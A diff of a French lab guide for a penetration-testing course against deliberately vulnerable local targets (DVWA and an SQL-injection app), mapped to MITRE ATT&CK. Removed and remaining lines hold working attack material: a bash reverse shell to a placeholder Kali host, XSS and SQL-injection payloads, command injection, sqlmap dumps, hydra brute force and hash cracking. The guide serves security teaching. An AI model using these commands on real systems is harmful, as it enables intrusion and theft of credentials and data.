@@ -11,14 +11,10 @@
 
 ## 2. Chaîne d'attaque complète (kill chain)
 
-```
-RECON → INITIAL ACCESS → EXECUTION → CREDENTIAL ACCESS → IMPACT
-  │          │               │              │                │
-  ├─ T1046   ├─ T1189        ├─ T1059.004   ├─ T1110         ├─ T1539
-  │  Scan    │  XSS          │  CMDi        │  Brute Force   │  Vol cookie
-  │          ├─ T1190        │              ├─ T1110.001     │
-  │          │  SQLi         │              │  Cracking      │
-```
+| RECON | INITIAL ACCESS | EXECUTION | CREDENTIAL ACCESS | IMPACT |
+|-------|---------------|-----------|-------------------|--------|
+| T1046 Scan | T1189 XSS | T1059.004 CMDi | T1110 Brute Force | T1539 Vol cookie |
+| | T1190 SQLi | | T1110.001 Cracking | |
 
 | Phase | Tactique MITRE | Techniques | Labs |
 |-------|---------------|------------|------|
@@ -41,12 +37,7 @@ RECON → INITIAL ACCESS → EXECUTION → CREDENTIAL ACCESS → IMPACT
 | **Cible** | `dvwa-target` (port `:8088`) |
 | **Durée** | 30 min |
 
-**Outils :**
-| Outil | Rôle | Commande clé |
-|-------|------|-------------|
-| `nmap` | Scan de ports et détection de versions | `nmap -sV -p 8088 localhost` |
-| `gobuster` | Énumération de répertoires web | `gobuster dir -u http://localhost:8088 -w /usr/share/wordlists/dirb/common.txt` |
-| `curl` | Requêtes HTTP automatisées, extraction de tokens CSRF | `curl -s -c /tmp/dvwa_cookie.txt -d "username=admin&password=password&..." ...` |
+**Outils :** `nmap`, `gobuster`, `curl`
 
 **Déroulement :**
 1. Scan nmap pour confirmer le port 8088 ouvert et identifier Apache (détection de version)
@@ -72,12 +63,7 @@ RECON → INITIAL ACCESS → EXECUTION → CREDENTIAL ACCESS → IMPACT
 | **Cible** | `dvwa-target` — pages XSS Reflected et Stored |
 | **Durée** | 30 min |
 
-**Outils :**
-| Outil | Rôle | Commande clé |
-|-------|------|-------------|
-| Firefox | Navigation dans DVWA, exécution des payloads JS | Saisie manuelle des payloads |
-| `python3` | Serveur HTTP pour exfiltration du cookie | `python3 -m http.server 8000` |
-| `curl` | Injection automatisée (alternative) | Vérification par script |
+**Outils :** Firefox, `python3`, `curl`
 
 **Déroulement :**
 1. **Reflected XSS** : Injecter `<script>alert('XSS fonctionnel')</script>` dans le champ "What's your name?"
@@ -102,11 +88,7 @@ RECON → INITIAL ACCESS → EXECUTION → CREDENTIAL ACCESS → IMPACT
 | **Cible** | `dvwa-target` — page SQLi (`/vulnerabilities/sqli/`) |
 | **Durée** | 30 min |
 
-**Outils :**
-| Outil | Rôle | Commande clé |
-|-------|------|-------------|
-| `sqlmap` | Automatisation de l'injection SQL et dump | `sqlmap -u "http://localhost:8088/vulnerabilities/sqli/?id=1&Submit=Submit" --load-cookies=/tmp/dvwa_cookie.txt -D dvwa -T users -C user,password --dump --batch` |
-| `curl` | Test manuel avec `OR 1=1` | `curl -s -b /tmp/dvwa_cookie.txt "http://localhost:8088/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27+%23&Submit=Submit" \| grep -c "First name"` |
+**Outils :** `sqlmap`, `curl`
 
 **Déroulement :**
 1. Test manuel : `id=1' OR '1'='1' #` → 5 utilisateurs retournés (au lieu d'1)
@@ -130,12 +112,7 @@ RECON → INITIAL ACCESS → EXECUTION → CREDENTIAL ACCESS → IMPACT
 | **Cible** | `dvwa-target` — page Command Injection (`/vulnerabilities/exec/`) |
 | **Durée** | 30 min |
 
-**Outils :**
-| Outil | Rôle | Commande clé |
-|-------|------|-------------|
-| `netcat` (nc) | Écouteur de reverse shell | `nc -lvnp 4444` |
-| `bash` | Payload de reverse shell | `bash -c 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1'` |
-| `curl` | Injection automatisée | Requête POST avec paramètre `ip=127.0.0.1;whoami` |
+**Outils :** `netcat` (nc), `bash`, `curl`
 
 **Déroulement :**
 1. **Injection basique** : `127.0.0.1; whoami` → confirme `www-data`
@@ -164,13 +141,7 @@ RECON → INITIAL ACCESS → EXECUTION → CREDENTIAL ACCESS → IMPACT
 | **Cible** | `sqli-app-target` (port `:8083`) — 3 points d'injection |
 | **Durée** | 1h |
 
-**Outils :**
-| Outil | Rôle | Commande clé |
-|-------|------|-------------|
-| `curl` | Tests manuels sur les 3 points d'injection | Tests `OR 1=1`, `admin' --`, `%' UNION SELECT...` |
-| `sqlmap` | Extraction automatisée des données | `sqlmap -u "http://localhost:8083/?page=search&id=1" --tables --batch` |
-| `john` | Cracking de hashs MD5 | `john --format=raw-md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt` |
-| `hashcat` | Cracking GPU (optionnel) | `hashcat -m 0 -a 0 --username hashes.txt /usr/share/wordlists/rockyou.txt --force` |
+**Outils :** `curl`, `sqlmap`, `john`, `hashcat` (optionnel)
 
 **Déroulement :**
 1. **Point 1** — Paramètre `?id=` (numeric) : `id=1 OR 1=1` → 6 produits
@@ -198,11 +169,7 @@ RECON → INITIAL ACCESS → EXECUTION → CREDENTIAL ACCESS → IMPACT
 | **Cible** | `dvwa-target` — formulaire de login (`/login.php`) |
 | **Durée** | 45 min |
 
-**Outils :**
-| Outil | Rôle | Commande clé |
-|-------|------|-------------|
-| `hydra` | Attaque par dictionnaire HTTP POST | `hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 8088 localhost http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"` |
-| `curl` | Analyse du formulaire et extraction du token CSRF | `curl -s -b /tmp/dvwa_cookie.txt "http://localhost:8088/login.php" \| grep -o 'name="[^"]*"'` |
+**Outils :** `hydra`, `curl`
 
 **Déroulement :**
 1. Analyse du formulaire : champs `username`, `password`, `Login`
@@ -221,37 +188,34 @@ RECON → INITIAL ACCESS → EXECUTION → CREDENTIAL ACCESS → IMPACT
 
 ## 4. Matrice des dépendances entre étapes
 
-```
-Étape 1 (LAB-2) : Reconnaissance ──────────────────────────┐
-    nmap, gobuster, curl                                    │
-    ↕                                                        │
-    [cookie DVWA + security=low] ← requis par toutes les     │
-    │   attaques web suivantes                                │
-    │                                                         │
-    ├──→ Étape 2 (LAB-3) : XSS ────────────────────────────┤│
-    │       T1189 — Drive-by Compromise                     ││
-    │       Dépend de : cookie DVWA (Étape 1)               ││
-    │                                                         │
-    ├──→ Étape 3 (LAB-4) : SQLi (DVWA) ────────────────────┤│
-    │       T1190 — Exploit Public-Facing App               ││
-    │       Dépend de : cookie DVWA (Étape 1)               ││
-    │                                                         │
-    ├──→ Étape 4 (LAB-5) : CMDi + Reverse Shell ───────────┤│
-    │       T1059.004 — Unix Shell                          ││
-    │       Dépend de : cookie DVWA (Étape 1)               ││
-    │                                                         │
-    ├──→ Étape 5 (LAB-6) : SQLi avancée + Cracking ────────┤│
-    │       T1190 + T1110.001                                ││
-    │       Indépendant (cible sqli-app:8083)                ││
-    │                                                         │
-    └──→ Étape 6 (LAB-7) : Brute Force Hydra ───────────────┤
-            T1110 — Brute Force                              │
-            Dépend de : information du formulaire (Étape 1)   │
-                                                             │
-    Tous les chemins mènent à :                              │
-    ┌───────────────────────────────────────────────────────┐│
-    │  Objectifs : Vol de session · Dump de base · Shell   ││
-    └───────────────────────────────────────────────────────┘│
+```text
+Étape 1 (LAB-2) : Reconnaissance
+    nmap, gobuster, curl
+         |
+         v
+    [cookie DVWA + security=low]   ← requis par toutes les attaques web
+         |
+         +---> Étape 2 (LAB-3) : XSS
+         |         T1189 — Drive-by Compromise
+         |         Dépend de : cookie DVWA (Étape 1)
+         |
+         +---> Étape 3 (LAB-4) : SQLi (DVWA)
+         |         T1190 — Exploit Public-Facing App
+         |         Dépend de : cookie DVWA (Étape 1)
+         |
+         +---> Étape 4 (LAB-5) : CMDi + Reverse Shell
+         |         T1059.004 — Unix Shell
+         |         Dépend de : cookie DVWA (Étape 1)
+         |
+         +---> Étape 5 (LAB-6) : SQLi avancée + Cracking
+         |         T1190 + T1110.001
+         |         Indépendant (cible sqli-app:8083)
+         |
+         +---> Étape 6 (LAB-7) : Brute Force Hydra
+                   T1110 — Brute Force
+                   Dépend de : formulaire login (Étape 1)
+
+    Objectifs finaux : Vol de session · Dump de base · Shell
 ```
 
 ---
